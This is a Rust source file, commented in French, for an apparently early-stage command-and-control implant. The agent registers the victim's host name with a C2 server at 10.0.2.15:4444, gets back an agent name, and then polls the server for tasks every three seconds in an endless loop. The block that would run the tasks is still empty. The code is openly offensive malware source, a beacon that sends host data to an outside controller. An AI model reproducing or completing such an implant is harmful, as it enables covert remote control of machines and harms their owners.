use std::collections::HashMap;
use std::time::Duration;
use hostname;
use reqwest::blocking::Client;
use std::error::Error;
use std::thread;

fn main() -> Result<(), Box<dyn Error>> {
    
    // Définition des informations sur le serveur C2 
    let ip = "10.0.2.15".to_string();
    let port = "4444".to_string();
    let key = "REPLACE_KEY".to_string();
    
    // Déclaration en milliseconde 
    let n: u64 = 3000;

    let hname_os = hostname::get()?; // Récupération du hostname

    let hname = hname_os.into_string().unwrap_or_else(|_| "unknown".to_string()); // Convertir le hostname en String

    let type_field = "p";

    let regl = format!("http://{}:{}/reg", ip, port); //Définition de l'URL du C2 pour les requêtes

    // HashMap pour stocker les données à envoyées au serveur C2
    let mut data = HashMap::new();
    data.insert("name", hname);
    data.insert("type", type_field.to_string());

    // Ouverture d'un client pour effectuer les requêtes
    let client = Client::new();

    // Envoie de la requête d'enregistrement auprès du serveur C2
    let response = client.post(&regl)
        .form(&data)
        .send()?;

    let name = response.text()?; // Réception de la réponse du serveur (agent name)
    println!("contenu de la réponse :{}", name); // debug

    // Création des variables pour les tâches et résultats
    let taskl = format!("http://{}:{}/tasks/{}", ip, port, name);
    let resultl = format!("http://{}:{}/results/{}",ip, port, name);
    
    // Démarrage boucle infini
    loop {


        let taskr = client.get(&taskl).send()?; // Requête GET afin de savoir si il y a une tâche 

        // Bloc d'actions si il y a une tâche
        if taskr.status() != 204 {
            let task = taskr.text()?;


        }

        thread::sleep(Duration::from_millis(n)); // L'agent sleep 3 secondes à chaque fin de boucle
        

    }

    Ok(())
}
